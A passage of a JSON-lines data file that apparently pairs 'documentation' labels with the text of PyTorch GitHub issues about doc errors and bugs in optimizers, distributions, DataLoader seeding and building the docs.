@jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/cppdocs/api/file_torch_library.h.html code block renders wrong\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nMemory leaks are reported relatively frequently but it's often a different issue, e.g. that there's a caching allocator and/or you are doing worst-case allocation (increasing the size each time).  Here's a recent example: https://github.com/pytorch/pytorch/issues/42557.\r\n\r\nWe should have a guide on how to debug these issues.\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"Great to see SWA as a part of `torch.optim`. It would be helpful to add the API reference for `SWALR` and `AveragedModel` in the `torch.optim` doc page (like the other schedulers and optimizers). Else, one has to look at the Github code to understand all the possible arguments for both of them. Thanks!\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nIn the docs of [`nn.functional.interpolate`](https://pytorch.org/docs/master/nn.functional.html#interpolate) it is stated that `align_corners` is a `bool` with default value `False`. Furthermore, it is stated that `align_corners` **does not affect** interpolation modes 'area' as well as 'nearest' .\r\n\r\nIf you look at the implementation however, default of `align_corners` is `None`. Furthermore, when passing a `bool` for `align_corners` together with interpolation modes 'nearest' or 'area' to `nn.functional.interpolate`, a [ValueError is raised](https://github.com/pytorch/pytorch/blob/73642d9425a358b51a683cf6f95852d06cba1096/torch/nn/functional.py#)\r\n\r\nThere is thus a clear mismatch between docstrings and implemented behavior of `align_corners` in combination with modes 'nearest' and 'area' for `nn.functional.interpolate`. Based on the intended behvaior, either the code or the docstrings should be changed.\r\n\r\nRelated PR that introduced `align_corners` and may clarify originally intended behavior: #5927\r\n\r\nI would vote for changing the code to adhere to the behavior outlined in the docstrings, and am up to fixing the issue regardless of the made decision.\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nSome equations in the document do not display. For example, [L1LOSS](https://pytorch.org/docs/stable/generated/torch.nn.L1Loss.html#torch.nn.L1Loss).\n\ncc @ezyang @zou3519 @jlin27"},{"labels":["documentation",null,null],"text":"The documentation for [OneCycleLR](https://pytorch.org/docs/stable/optim.html#torch.optim.lr_scheduler.OneCycleLR) mentions `verbose` as one of the arguments but the [code](https://pytorch.org/docs/stable/_modules/torch/optim/lr_scheduler.html#OneCycleLR) doesn't have that argument. Thus, it raises an error if someone passes a value for `verbose` just going by the documentation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nThe description on non_blocking should mention pinned memory, since `non_blocking` only affects copies between pinned memory (on the CPU) and GPU.\r\n\r\nThe current description for the non_blocking argument says \"if True and this copy is between CPU and GPU, the copy may occur asynchronously with respect to the host. For other cases, this argument has no effect.\" \r\n\r\nThe docs for `Tensor.cuda()` are better:\r\n\r\n\"If True and the source is in pinned memory, the copy will be asynchronous with respect to the host. Otherwise, the argument has no effect. Default: False.\"\r\n\r\nAdditionally, the description of non_blocking in `Tenosr.to()` should be improved. \n\ncc @jlin27"},{"labels":[null,"documentation",null,null],"text":"In `torch.renorm`, `dim` means \r\n> dim (int) – the dimension to slice over to get the sub-tensors\r\n\r\nThat is, if one wants to renormalize each row tensor (i.e., tensor along dim **`1`**) of a matrix, they need to specify `dim=0`. This means inconsistency with `.norm` and many other ops. E.g, users will be confused when they see\r\n\r\n```py\r\nIn [12]: torch.renorm(x, p=1, maxnorm=0.1, dim=-1).norm(p=2, dim=-1)\r\nOut[12]: tensor([0.3127])\r\n```\r\n\r\nI don't know what is the proper thing to do, but there should be some improvements done.\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\nStrange behavior in torch.distributions.negative_binomial:\r\nhttps://pytorch.org/docs/stable/distributions.html#negativebinomial\r\n\r\nWhen trying out the negative binomial distribution I found that the second input parameter prob (success probability) is actually the failure probability --> not consistent with documentation. This is also not consistent with other software such as scipy.\r\n\r\nExample:\r\nIn [1]: import torch \r\n   ...: from scipy.stats import nbinom \r\n   ...: import numpy as np \r\n   ...: n=2.0 \r\n   ...: x=0.0 \r\n   ...: p=.75 \r\n   ...: dis=torch.distributions.NegativeBinomial(n, 1-p) \r\n   ...: prob_torch=dis.log_prob(torch.tensor(x)).exp() \r\n   ...: prob_np=nbinom.pmf(x,n,p) \r\n   ...: np.isclose(prob_np,prob_torch.numpy())                                  \r\nOut[1]: True\r\n\r\n\n\ncc @vincentqb @fritzo @neerajprad @alicanb @vishwakftw @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe documentation for the `OneCycleLR` learning rate schedule refers to the argument `pct_start` as being a percentage [0,100], whereas it actually used as a proportion [0,1] in the code.\r\n\r\n> pct_start (float) – The percentage of the cycle (in number of steps) spent increasing the learning rate. Default: 0.3\r\n\r\ncompared to the implementation in `torch.optim.lr_scheduler.OneCycleLR`\r\n```python\r\n        self.step_size_up = float(pct_start * self.total_steps) - 1\r\n```\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nHi,\r\n\r\nOn the web page https://pytorch.org/docs/master/generated/torch.stft.htmlwhich documents torch.stft, normalization is defined as follows:\r\n\r\nf normalized is True (default is False), the function returns the normalized STFT results, i.e., multiplied by (frame_length)−0.5(\\text{frame\\_length})^{-0.5}(frame_length)−0.5 .\r\n\r\nBut frame_length is not defined anywhere on the page.  I think frame_length should be \"win_length\", which later on the page is defined to be the size of a window frame.\r\n\r\nBruce Maggs\r\n\n\ncc @jlin27"},{"labels":[null,null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\nIn our [distributed docs](https://pytorch.org/docs/stable/distributed.html) under \"Synchronous and asynchronous collective operations\" we document `work.wait()` and `work.is_completed()`, but the documentation is not completely accurate in the case of NCCL.\r\n\r\nFor a NCCL Work object, `wait()` does not in general block the process and instead synchronizes the NCCL stream with the default stream. `is_completed` does check if the kernel execution is finished but can return false even after calling wait. It might also be useful to clarify the blocking behavior can be achieved with `NCCL_BLOCKING_WAIT=1`.\r\n\n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":["documentation",null],"text":"It looks like bitwise_and/bitwise_and_ have no arguments (like bitwise_not_) which is not true\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/88780198-f091cb00-d18a-11ea-9b12-dcba701d339b.png)\r\n\n\ncc @jlin27"},{"labels":[null,"documentation"],"text":"There is a tiny mistake in the documentation of torch.cuda.amp.GradScaler. Under the description of __init__ parameters:\r\n```Python\r\n\"\"\"\r\n        growth_factor (float, optional, default=2.0):  Factor by which the scale is multiplied during\r\n            :meth:`update` if no inf/NaN gradients occur for ``growth_factor`` consecutive iterations\r\n\"\"\"\r\n```\r\nShould be for ``growth_interval`` consecutive iterations?\n\ncc @mcarilli @jlin27"},{"labels":["documentation",null],"text":"## 🚀 Feature\r\n<!-- A clear and concise description of the feature proposal -->\r\nThe following code:\r\n\r\n```\r\nimport torch\r\na = torch.arange(0, 4)\r\nb = torch.tensor(a)\r\n```\r\n\r\ngenerates a warning at the console:\r\n\r\n```UserWarning: To copy construct from a tensor, it is recommended to use sourceTensor.clone().detach() or sourceTensor.clone().detach().requires_grad_(True), rather than torch.tensor(sourceTensor).```\r\n\r\nThis warning should be eliminated.\r\n\r\n## Motivation\r\n\r\n<!-- Please outline the motivation for the proposal. Is your feature request related to a problem? e.g., I'm always frustrated when [...]. If this is related to another GitHub issue, please link here too -->\r\n\r\nI often write code that is designed to accept any type that's convertible to a tensor as input, and I don't want my code to have any side effects on the input.  `torch.tensor()` provides the perfect semantics for this use-case since - as documented - it always copies its input.  For example:\r\n\r\n```\r\ndef foo(x):\r\n  # x might be a scalar, list, tuple, `numpy.ndarray`, `torch.Tensor`, etc.\r\n  x = torch.tensor(x)\r\n  # Return something based on x\r\n```\r\n\r\nIn this case, the warning is extremely annoying, since its suggestion to use `Tensor.clone().detach()` instead only works if the input is already a tensor.  Furthermore, it isn't clear why a warning is necessary here at all - it might as well be saying \"Warning: this function works as documented!\"\r\n\r\n## Pitch\r\n\r\n<!-- A clear and concise description of what you want to happen. -->\r\n\r\nPlease eliminate this warning.  If necessary, incorporate its advice into the documentation for `torch.tensor()` instead.\r\n\r\n## Alternatives\r\n\r\n<!-- A clear and concise description of any alternative solutions or features you've considered, if any. -->\r\n\r\nPerhaps this warning is suggesting that `torch.tensor` will be deprecated or modified in the future?  If so, it would be better to incorporate those plans into the documentation.\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context or screenshots about the feature request here. -->\r\n\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nLatest: https://pytorch.org/docs/stable/autograd.html (no record_function)\r\nV1.4: https://pytorch.org/docs/1.4.0/autograd.html (record_function documented)\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"Including creating the appropriate PyCapsule (pycapsule stuff seems to not be part of standard? or not mentioned explicitly?) and if its destructor is needed.\r\n\r\nI recently did this work to interop with ffmpeg and made two examples: \r\n\r\n1. https://github.com/vadimkantorov/pydlpack (relevant PyCapsule code here: https://github.com/vadimkantorov/pydlpack/blob/master/dlpack.py#L91)\r\n2. https://github.com/vadimkantorov/readaudio\r\n\r\nWhile memory management in this scenario is hard to do completely right, it still may be useful for the cases when full-blown PyTorch Extension would require learning Torch C++ API and working with C++.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nConsider the documentation for Conv2d against 1.7.0:\r\n`\r\ntorch.nn.Conv2d(in_channels: int, out_channels: int, kernel_size: Union[T, Tuple[T, T]], stride: Union[T, Tuple[T, T]] = 1, padding: Union[T, Tuple[T, T]] = 0, dilation: Union[T, Tuple[T, T]] = 1, groups: int = 1, bias: bool = True, padding_mode: str = 'zeros')\r\n`\r\n\r\nThe \"T\" type is never defined and not particularly useful for documentation, even if it is the correct mypy type.  We should have a better strategy here.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n\r\nIn the API docs, the function names should NOT be capitalized. For example, in https://pytorch.org/docs/master/generated/torch.set_flush_denormal.html#torch.set_flush_denormal\r\n\r\nwe should not write\r\n\r\n```\r\nTORCH.SET_FLUSH_DENORMAL\r\n```\r\n\r\nbut \r\n\r\n```\r\ntorch.set_flush_denormal\r\n```\r\n\r\nPython - like many other programming languages - is case sensitive.\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"Documentation pretends that weights and bias are initialized uniformly in +-1/sqrt(in), whereas the code uses kaiming for weights and a kaiming variant for biases.\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\nWe occasionally see users post about performance issues when using NCCL for distributed training ([example](https://discuss.pytorch.org/t/distributeddataparallel-on-multiple-gpu-nodes-slower-than-one-gpu-node/75984), [example](https://github.com/pytorch/fairseq/issues/789)). Often tuning some NCCL environment variables such as `NCCL_MIN_NRINGS`, `NCCL_SOCKET_NTHREADS` can help with the performance depending on the network, so we should document these suggestions in our [distributed docs](https://pytorch.org/docs/stable/distributed.html) to help users self-troubleshoot performance issues. \n\ncc @pietern @mrshenli @pritamdamania87 @zhaojuanmao @satgera @rohan-varma @gqchen @aazzolini @xush6528 @osalpekar @jiayisuse @agolynski @jlin27"},{"labels":[null,"documentation",null],"text":"## 🐛 Bug\r\n\r\nBuilding the docs for me as an end user (offline documentation) does not work.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1. Check out the pytorch repo at tag `v1.5.1`.\r\n1. Create and activate virtual environment: `cd /path/to/pytorch; python3 -m venv .venv; source .venv/bin/activate`\r\n1. Install pytorch version 1.5.1: `pip3 install torch==v1.5.1`\r\n1. Install requirements needed for docs: `cd docs; pip3 install -U -r requirements.txt`\r\n1. Trying to build the docs: `make; make html`\r\n\r\nAll steps together:\r\n```bash\r\ngit clone https://github.com/pytorch/pytorch.git\r\ncd pytorch\r\ngit checkout v1.5.1\r\npython3 -m venv .venv\r\nsource .venv/bin/activate\r\npip3 install torch==v1.5.1\r\ncd docs\r\npip3 install -U -r requirements.txt\r\nmake\r\nmake html\r\n```\r\n\r\nWhen the `make html` step tries to write the output, it fails like this:\r\n```\r\npreparing documents... done\r\nwriting output... [ 23%] distributions                                                                                                                                                                             \r\nException occurred:\r\n  File \"/usr/lib/python3.6/subprocess.py\", line 1364, in _execute_child\r\n    raise child_exception_type(errno_num, err_msg, err_filename)\r\nFileNotFoundError: [Errno 2] No such file or directory: 'katex': 'katex'\r\nThe full traceback has been saved in /tmp/sphinx-err-tsyb3hy5.log, if you want to report the issue to the developers.\r\nPlease also report this if it was a user error, so that a better error message can be provided next time.\r\nA bug report can be filed in the tracker at <https://github.com/sphinx-doc/sphinx/issues>. Thanks!\r\nMakefile:38: recipe for target 'html' failed\r\nmake: *** [html] Error 2\r\n```\r\n\r\n\r\n## Expected behavior\r\n\r\nI expect the build process to work. Other users seemed to have problems with it before [here](https://discuss.pytorch.org/t/generate-offline-documentation/64643/6) and [here](https://discuss.pytorch.org/t/accessing-pytorch-documentation-offline/20453), but I already avoided the mistakes made there.\r\n\r\n## Environment\r\n\r\nGenerated output from your\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py).\r\n\r\n```\r\nPyTorch version: 1.5.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.2\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0\r\nCMake version: version 3.10.2\r\n\r\nPython version: 3.6\r\nIs CUDA available: No\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: Quadro P2000\r\nNvidia driver version: 410.104\r\ncuDNN version: Probably one of the following:\r\n/usr/lib/x86_64-linux-gnu/libcudnn.so.7.3.1\r\n/usr/local/cuda-10.0/targets/x86_64-linux/lib/libcudnn.so.7.4.2\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.19.1\r\n[pip3] pytorch-sphinx-theme==0.0.24\r\n[pip3] torch==1.5.1\r\n[conda] Could not collect\r\n```\n\ncc @ezyang @zou3519 @jlin27"},{"labels":[null,"documentation",null],"text":"## 📚 Documentation\r\n\r\n\"Distributed RPC Framework\" documentation (master version) contains the following note:\r\n\r\n> Please refer to [PyTorch Distributed Overview](https://pytorch.org/docs/master/rpc.html) for a brief introduction to all features related to distributed training.\r\n\r\n<img width=\"976\" alt=\"Screen Shot 2020-07-24 at 12 44 58\" src=\"https://user-images.githubusercontent.com/2459423/88383996-dd0deb00-cdab-11ea-86ed-89def1b30e58.png\">\r\n\r\nThe link behind \"PyTorch Distributed Overview\" is missing.\r\n\r\nI could send a PR with a quick fix, but I can not figure out where is the correct ressource...\r\n\r\ncc @mrshenli "},{"labels":[null,"documentation",null],"text":"It would be nice to have this in docs directly, since loops like `for device in range(torch.cuda.device_count())` are simpler if it is known to return 0 when no CUDA is compiled or it is not available\r\n\r\nIn https://discuss.pytorch.org/t/torch-cuda-device-count-with-no-cuda-compiled-available/90328 it seems so!\n\ncc @ngimel @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\n\r\nThe original question was posted [here](https://discuss.pytorch.org/t/torch-exp-is-modified-by-an-inplace-operation/90216). As `torch.exp()` leverages its output for calculating its gradient while most other functions use their input, `torch.exp()` has a different behavior when its output is inplaced, which is not natural to users. I understand that this implementation is beneficial to the code efficiency. The description of `torch.exp()` in the document should emphasize this property.\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\n\ncc @jlin27"},{"labels":[null,null,"documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\nA segmentation fault occurs when passing an array for `streams` argument.\r\n\r\n## To Reproduce\r\n\r\n```python\r\nimport torch\r\n\r\nx = [[[3, 2, 3],[1, 3, 4]],\r\n       [[3, 1, 2],[3, 2, 4]],\r\n       [[4, 4, 2], [1, 1, 1]]] \r\ntorch.cuda.comm.scatter(torch.tensor(x), [1], chunk_sizes=None, dim=0, streams=[1, 2])\r\n```\r\n\r\n## Expected behavior\r\n\r\nNo segfault. There is no documentation for `streams` argument, so it is not clear what the function expects for an input other than the default value(None). \r\n\r\n## Environment\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: Could not collect\r\nCMake version: version 3.14.0\r\n\r\nPython version: 3.7\r\nIs CUDA available: No\r\nCUDA runtime version: No CUDA\r\nGPU models and configuration: No CUDA\r\nNvidia driver version: No CUDA\r\ncuDNN version: No CUDA\r\n\r\nVersions of relevant libraries:\r\n[pip] numpy==1.18.1\r\n[pip] torch==1.5.0\r\n[pip] torchvision==0.6.0a0+82fd1c8\r\n[conda] blas 1.0 mkl\r\n[conda] cudatoolkit 10.1.243 h6bb024c_0\r\n[conda] mkl 2020.1 217\r\n[conda] mkl-include 2020.1 217\r\n[conda] mkl-service 2.3.0 py37he904b0f_0\r\n[conda] mkl_fft 1.0.15 py37ha843d7b_0\r\n[conda] mkl_random 1.1.0 py37hd6b4f25_0\r\n[conda] numpy 1.18.1 py37h4f9e942_0\r\n[conda] numpy-base 1.18.1 py37hde5b4d6_1\r\n[conda] pytorch 1.5.0 py3.7_cuda10.1.243_cudnn7.6.3_0 pytorch\r\n[conda] torchvision 0.6.0 py37_cu101 pytorch\r\n\n\ncc @ezyang @gchanan @zou3519 @ngimel @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/cuda.html :\r\n\r\nBoth reset_peak_stats and reset_peak_memory_stats are mentioned, but no docs are available.\n\ncc @jlin27"},{"labels":["documentation",null],"text":"https://pytorch.org/docs/master/tensors.html?highlight=narrow_copy#torch.Tensor.narrow_copy:\r\n\r\n![image](https://user-images.githubusercontent.com/1041752/87787192-83ea0880-c83b-11ea-9cfa-fc7b78c59591.png)\r\n\r\nMaybe worth having some assert/search that docs have no backticks (usually, it's an indicator of markdown problem)\n\ncc @jlin27"},{"labels":["documentation",null],"text":"## 🐛 Bug\r\n\r\nI could not find this in the documentation, but it seems like `torch.cuda.BoolTensor` actually uses a byte for each element instead of a bit.\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n```python\r\nimport torch\r\nx = torch.empty([], device=\"cuda\") # load something on GPU to get a baseline\r\n# running nvidia-smi, I see the GPU has 715 MiB of RAM in use\r\n# let's create a tensor which should take 10 MiB:\r\nx = torch.empty(10*8*1024**2, dtype=torch.bool, device=\"cuda\")\r\nassert x.element_size() == 1\r\n# running nvidia-smi, the GPU has 795 MiB of RAM used, or ~ 80 MiB additional (instead of the 10 MiB expected)\r\n```\r\n\r\nChecking repeatedly with different sizes of tensors indicated that a `torch.cuda.BoolTensor` takes 8 bits per element on GPU.\r\n\r\n## Expected behavior\r\n\r\nEither `torch.cuda.BoolTensor` should only take 1 bit per element (not sure if there is a GPU limitation here) or `x.element_size()` should return 8\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.5.1\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: CentOS Linux release 7.6.1810 (Core)\r\nGCC version: (GCC) 4.8.5 20150623 (Red Hat 4.8.5-36)\r\nCMake version: version 2.8.12.2\r\n\r\nPython version: 3.7\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.1.168\r\nGPU models and configuration:\r\nGPU 0: GeForce RTX 2080 Ti\r\n\r\nNvidia driver version: 418.87.00\r\ncuDNN version: Could not collect\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.18.5\r\n[pip3] pytorch-utils==0.1\r\n[pip3] torch==1.5.1\r\n[conda] blas                      1.0                         mkl\r\n[conda] cudatoolkit               10.1.243             h6bb024c_0\r\n[conda] mkl                       2020.1                      217\r\n[conda] mkl-service               2.3.0            py37he904b0f_0\r\n[conda] mkl_fft                   1.1.0            py37h23d657b_0\r\n[conda] mkl_random                1.1.1            py37h0573a6f_0\r\n[conda] numpy                     1.18.5           py37ha1c710e_0\r\n[conda] numpy-base                1.18.5           py37hde5b4d6_0\r\n[conda] pytorch                   1.5.1           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch\r\n[conda] pytorch-utils             0.1                       dev_0    <develop>\n\ncc @jlin27"},{"labels":["documentation",null,null,null],"text":"# 📚 Documentation\r\n\r\n## PyTorch docs\r\n\r\nWhat's going on with `momentum` in BatchNorm? `0.9` of momentum means I keep `0.9` of the old stuff and add `0.1` of the new one. Why is it reversed here? `momentum` equal `0` means I'm running with no memory of the past.\r\n\r\nAlso, the default value is way off! It should be `0.99`, not `0.9`.\r\n\r\n![image](https://user-images.githubusercontent.com/2119355/87723066-34e29b80-c787-11ea-86c1-1eea693fd377.png)\r\n![image](https://user-images.githubusercontent.com/2119355/87722818-c43b7f00-c786-11ea-9452-d8b1d503a2cc.png)\r\n\r\n## Keras docs\r\n\r\nA more sensible approach.\r\n\r\n![image](https://user-images.githubusercontent.com/2119355/87723043-298f7000-c787-11ea-84fe-3a5f09f5c2c8.png)\r\n\n\ncc @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null,null,null],"text":"## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\n\r\n## To Reproduce\r\n\r\nSteps to reproduce the behavior:\r\n\r\n1.\r\n1.\r\n1.\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\n## Environment\r\n\r\nPlease copy and paste the output from our\r\n[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)\r\n(or fill out the checklist below manually).\r\n\r\nYou can get the script and run it with:\r\n```\r\nwget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py\r\n# For security purposes, please check the contents of collect_env.py before running it.\r\npython collect_env.py\r\n```\r\n\r\n - PyTorch Version (e.g., 1.0):\r\n - OS (e.g., Linux):\r\n - How you installed PyTorch (`conda`, `pip`, source):\r\n - Build command you used (if compiling from source):\r\n - Python version:\r\n - CUDA/cuDNN version:\r\n - GPU models and configuration:\r\n - Any other relevant information:\r\n\r\n## Additional context\r\n\r\n<!-- Add any other context about the problem here. -->\r\n\n\ncc @ezyang @gchanan @zou3519 @jlin27 @albanD @mruberry"},{"labels":[null,"documentation",null,null],"text":"## 📚 Documentation\r\n\r\n<!-- A clear and concise description of what content in https://pytorch.org/docs is an issue. If this has to do with the general https://pytorch.org website, please file an issue at https://github.com/pytorch/pytorch.github.io/issues/new/choose instead. If this has to do with https://pytorch.org/tutorials, please file an issue at https://github.com/pytorch/tutorials/issues/new -->\r\n\r\nHello, I noticed this older issue https://github.com/pytorch/pytorch/issues/6662 is still open and looked through this PR https://github.com/pytorch/pytorch/pull/24435 about adding `doctest` to jit. If it would be helpful I can work on other parts of the docs to convert code blocks to use `doctest`. Currently it seems there are over 400 code blocks in the docs using the format `Example::` that are not being tested, e.g. a bunch are in this [file](https://github.com/pytorch/pytorch/blob/master/torch/_torch_docs.py). \n\ncc @jlin27 @mruberry @VitalyFedyunin"},{"labels":["documentation",null,null],"text":"In https://pytorch.org/docs/stable/_modules/torch/optim/adam.html#Adam, towards the end, we have\r\n\r\n```\r\n                    denom = (exp_avg_sq.sqrt() / math.sqrt(bias_correction2)).add_(group['eps'])\r\n```\r\n\r\nHowever, the [paper](https://arxiv.org/pdf/1412.6980.pdf) uses epsilon by adding it to `exp_avg_sq.sqrt()`; not to a whole fraction.\r\nThis is always the case, in both the Algorithm 1 formulation, as well as the one before Section 2.1.\r\n\r\nWhat pytorch does is that it uses `epsilon * sqrt(1 - beta_2^t)` instead of just `epsilon`, for the paper's algoritm formulation.\n\ncc @jlin27 @vincentqb"},{"labels":["documentation",null],"text":"## 📚 Documentation\r\n![image](https://user-images.githubusercontent.com/33288114/87407914-60ce1780-c5f5-11ea-80eb-4fdb8c374463.png)\r\n\r\nThis formula confuses me because this formula does not look like a matrix formula. I can't determine whether W or x is a matrix or a vector.I think your formula does not consider the consistency of matrix dimensions.\r\n\r\nAccording to the relevant weights and input dimensions provided by the official documentation ， I think the correct formula should be:\r\n![image](https://user-images.githubusercontent.com/33288114/87409139-1e0d3f00-c5f7-11ea-953e-3fe0ffcb727f.png)\r\n\r\n\r\n\n\ncc @jlin27"},{"labels":["documentation",null,null],"text":"## 📚 Documentation\r\nFor the parameter 'dim', the documentation says 'If the value is None, matrix norm will be calculated when the input tensor only has two dimensions, vector norm will be calculated when the input tensor only has one dimension. If the input tensor has more than two dimensions, the vector norm will be applied to last dimension.'\r\n\r\nMy code is:\r\nA = torch.randn(4, 3, 3)\r\nB = torch.norm(A)\r\nprint(B)\r\nThe result is:\r\ntensor(5.7707)\r\n\r\nIt seems that torch.norm computes the sum of the square of every number in the tensor A and returns the square root of the sum. However, the documentation says ' the vector norm will be applied to the last dimension'. I think what the function does contradicts the documentation. By the way, I prefer what the function does, because computing the Frobenius norm of a three or more dimensional tensor is useful. So, I think to change the documentation is a good idea, instead of to fix the implementation of torch.norm.\n\ncc @jlin27"},{"labels":[null,"documentation",null],"text":"Old title: Random seed of numpy is reset to the same value inside DataLoader workers\r\n\r\n## 🐛 Bug\r\n\r\n<!-- A clear and concise description of what the bug is. -->\r\nI’m using an IterableDataset inside a DataLoader (with multiple workers).  My IterableDataset code calls numpy.random functions. In each epoch and for each worker, I noticed the sequence of values returned by numpy.random functions is exactly the same.  This is unexpected since numpy would normally seed the random generator when it is initialized.\r\n\r\nExample use case: the IterableDataset uses numpy.random to choose image crops - expected to be, well, *random*, not exactly the same for each image for each epoch.\r\n\r\nNote: this happens without calling torch.manual_seed() or numpy.random.seed(), and without doing anything to make things deterministic.  Even if determinism is the default PyTorch policy, the workers should not get re-seeded each epoch.\r\n\r\n## To Reproduce\r\n\r\n<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->\r\n\r\n```\r\nimport torch\r\nimport numpy as np\r\nfrom torch.utils.data import DataLoader, Dataset\r\n\r\nclass TestIterableDataset(torch.utils.data.IterableDataset):\r\n    def __init__(self):\r\n        super(TestIterableDataset).__init__()\r\n\r\n    def __iter__(self):\r\n        worker_info = torch.utils.data.get_worker_info()\r\n        for n in range(10):\r\n            yield(worker_info.id, np.random.randint(1000000))\r\n            \r\nds = TestIterableDataset()\r\n\r\nfor worker_id, number in DataLoader(ds, batch_size=4, num_workers=2):\r\n    print(worker_id, number)\r\n\r\nfor worker_id, number in DataLoader(ds, batch_size=4, num_workers=2):\r\n    print(worker_id, number)\r\n```\r\n\r\nThis prints the same result every time it is run, and the same sequence of random numbers from each worker:\r\n```\r\n# tensor([0, 0, 0, 0]) tensor([ 68669, 230721, 801136, 274196])\r\n# tensor([1, 1, 1, 1]) tensor([ 68669, 230721, 801136, 274196])\r\n# tensor([0, 0, 0, 0]) tensor([617084, 429589, 436968, 718987])\r\n# tensor([1, 1, 1, 1]) tensor([617084, 429589, 436968, 718987])\r\n# tensor([0, 0]) tensor([150977,  59469])\r\n# tensor([1, 1]) tensor([150977,  59469])\r\n```\r\n\r\n## Expected behavior\r\n\r\n<!-- A clear and concise description of what you expected to happen. -->\r\n\r\nNumpy random generator would seed itself from /dev/urandom when RandomState is initialized (different in each worker).\r\n\r\n## Environment\r\n\r\nPyTorch version: 1.5.0\r\nIs debug build: No\r\nCUDA used to build PyTorch: 10.1\r\n\r\nOS: Ubuntu 18.04.4 LTS\r\nGCC version: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0\r\nCMake version: version 3.13.3\r\n\r\nPython version: 3.6\r\nIs CUDA available: Yes\r\nCUDA runtime version: 10.0.130\r\nGPU models and configuration: GPU 0: Tesla T4\r\nNvidia driver version: 440.33.01\r\ncuDNN version: Probably one of the following:\r\n/usr/local/cuda-10.1/targets/x86_64-linux/lib/libcudnn.so.7.6.5\r\n/usr/local/cuda-10.2/targets/x86_64-linux/lib/libcudnn.so.7.6.5\r\n\r\nVersions of relevant libraries:\r\n[pip3] numpy==1.15.4\r\n[conda] blas                      1.0                         mkl  \r\n[conda] cudatoolkit               10.1.243             h6bb024c_0  \r\n[conda] mkl                       2020.0                      166  \r\n[conda] mkl-service               2.3.0            py36he904b0f_0  \r\n[conda] mkl_fft                   1.0.15           py36ha843d7b_0  \r\n[conda] mkl_random                1.1.0            py36hd6b4f25_0  \r\n[conda] numpy                     1.18.1           py36h4f9e942_0  \r\n[conda] numpy-base                1.18.1           py36hde5b4d6_1  \r\n[conda] numpydoc                  0.9.2                      py_0  \r\n[conda] pytorch                   1.5.0           